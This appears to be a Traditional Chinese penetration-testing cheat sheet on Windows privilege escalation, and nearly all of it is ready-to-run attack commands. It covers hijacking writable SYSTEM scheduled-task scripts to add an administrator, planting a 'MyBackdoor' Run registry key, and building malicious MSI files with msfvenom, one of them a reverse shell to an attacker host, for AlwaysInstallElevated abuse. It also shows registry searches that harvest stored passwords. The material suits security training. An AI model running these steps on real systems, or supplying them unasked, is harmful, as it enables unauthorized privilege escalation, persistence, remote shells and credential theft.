## 理論基礎：排程工作提權

Windows 排程工作（Task Scheduler）以指定帳號的身份執行程式。如果一個以 SYSTEM 執行的工作，其執行的腳本/EXE 放在使用者可以**寫入的位置**，就可以替換後等工作觸發，取得 SYSTEM 權限。

---

## 排程工作枚舉

```cmd
:: 列出所有排程工作（重點看 Run As User 欄）
schtasks /query /fo LIST /v
:: /query → 查詢模式
:: /fo LIST → 以列表格式輸出
:: /v       → 詳細資訊（包含 Run As User / Task To Run）

:: 精簡輸出（只看重要欄位）
schtasks /query /fo CSV /nh | ConvertFrom-Csv | Select TaskName, "Run As User", "Task To Run"

:: PowerShell 版（更好過濾）
Get-ScheduledTask | Where-Object {$_.Principal.UserId -notmatch "Users"} |
  Select TaskName, @{n="RunAs";e={$_.Principal.UserId}}, @{n="Action";e={$_.Actions.Execute}}
:: 過濾掉以普通使用者身份執行的工作，只看高權身份

:: 重點看什麼：
:: Run As User = SYSTEM 或 DOMAIN\高權帳號
:: Task To Run = 腳本/EXE 的路徑（去確認 ACL）
```

## 排程工作提權（修改執行檔）

```cmd
:: Step 1：找排程工作執行的腳本/EXE
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User"

:: Step 2：確認 ACL（目標腳本是否可寫）
icacls "C:\Path\To\task_script.ps1"
icacls "C:\Path\To\task.exe"
:: 找 BUILTIN\Users:(M) 或 Everyone:(W)

:: Step 3a：如果是 .bat / .ps1 腳本（直接追加指令）
echo net localgroup Administrators MYUSER /add >> "C:\Path\To\task_script.bat"
:: >> 追加到檔案末尾（不覆蓋原有內容，更隱蔽）

:: Step 3b：如果是 .exe（替換執行檔）
copy evil.exe "C:\Path\To\task.exe"

:: Step 4：等工作觸發（或手動觸發）
schtasks /run /tn "Task Name"
:: /run → 立即執行
:: /tn  → 指定工作名稱（Task Name，從 /query 輸出取得）

:: Step 5：確認
net localgroup Administrators
```

## 登錄檔自動執行位置

```cmd
:: 系統啟動自動執行（SYSTEM 級別）
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

:: 使用者登入自動執行（該使用者身份）
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

:: 找這些位置執行的 EXE 的 ACL
:: 如果 EXE 是在可寫目錄，可以替換成惡意 EXE
icacls "C:\Path\From\Registry\Value\program.exe"

:: 新增自動執行項目（需要有寫入權限）
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /d "C:\Temp\shell.exe" /f
:: /v → 值名稱
:: /d → 資料（路徑）
:: /f → 強制覆蓋（不提示確認）
```

## AlwaysInstallElevated（MSI 提權）

### 理論

如果以下兩個登錄機碼都設為 1，任何使用者安裝的 MSI 檔案都會以 SYSTEM 身份執行（即使使用者是低權限）。

```cmd
:: 確認是否開啟（兩個都要是 1 才能利用）
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 兩個都是 0x1 → 可利用

:: 生成惡意 MSI（加管理員帳號）
msfvenom -p windows/x64/exec CMD="net localgroup Administrators MYUSER /add" -f msi -o evil.msi
:: 或 reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f msi -o evil.msi

:: 上傳並安裝（以低權使用者身份）
msiexec /quiet /qn /i C:\Temp\evil.msi
:: /quiet → 靜默模式（不顯示進度）
:: /qn    → 無使用者介面
:: /i     → 安裝

:: PowerUp 自動確認
Get-RegistryAlwaysInstallElevated
```

## 登錄檔密碼搜尋

```cmd
:: 找 AutoLogon 密碼
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

:: 搜尋所有含 password 的登錄值
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
:: /f password → 搜尋關鍵字
:: /t REG_SZ   → 只查字串類型
:: /s          → 遞迴搜所有子機碼

:: SNMP community strings（可能有密碼）
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s

:: PuTTY sessions（可能存有 SSH 密鑰路徑或密碼）
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

## 速查表

```cmd
:: 找排程工作（看 Run As User 和 Task To Run）
schtasks /query /fo LIST /v | findstr /i "Run As\|Task To Run\|Status"

:: 立即執行排程工作
schtasks /run /tn "TASK_NAME"

:: AlwaysInstallElevated 確認
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: AutoLogon 密碼
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: 搜尋登錄檔密碼
reg query HKLM /f password /t REG_SZ /s
```
